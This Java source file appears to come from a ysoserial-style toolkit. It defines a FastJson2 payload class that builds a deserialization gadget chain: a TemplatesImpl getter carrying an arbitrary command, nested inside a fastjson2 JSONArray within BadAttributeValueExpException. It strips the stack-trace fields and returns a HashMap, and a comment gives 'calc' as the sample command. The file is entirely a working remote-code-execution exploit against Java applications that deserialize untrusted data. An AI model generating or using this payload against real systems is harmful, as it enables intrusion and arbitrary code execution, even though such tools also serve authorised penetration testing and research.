package cn.butler.yso.payloads;

import cn.butler.payloads.ObjectPayload;
import cn.butler.yso.payloads.util.Gadgets;
import com.alibaba.fastjson2.JSONArray;
import cn.butler.payloads.annotation.Authors;
import cn.butler.payloads.annotation.Dependencies;
import cn.butler.payloads.PayloadRunner;
import cn.butler.yso.payloads.util.Reflections;

import javax.management.BadAttributeValueExpException;
import java.util.HashMap;

@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({"com.alibaba:fastjson:2.x"})
@Authors({Authors.B0T1ER})
public class FastJson2 implements ObjectPayload<Object> {

    public static void main(String[] args) throws Exception {
        //args = new String[]{"TemplatesImpl:raw_cmd:calc"};
        PayloadRunner.run(FastJson2.class, args);
    }

    public Object getObject(final String command) throws Exception {
        final Object object = Gadgets.createGetter(command);
        JSONArray jsonArray = new JSONArray();
        jsonArray.add(object);

        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
        Reflections.setFieldValue(badAttributeValueExpException, "val", jsonArray);
        //清除堆栈信息
        Reflections.setFieldValue(badAttributeValueExpException,"stackTrace",new StackTraceElement[0]);
        Reflections.setFieldValue(badAttributeValueExpException,"cause",null);
        Reflections.setFieldValue(badAttributeValueExpException,"suppressedExceptions",null);

        HashMap hashMap = new HashMap();
        hashMap.put(object, badAttributeValueExpException);

        return hashMap;
    }
}
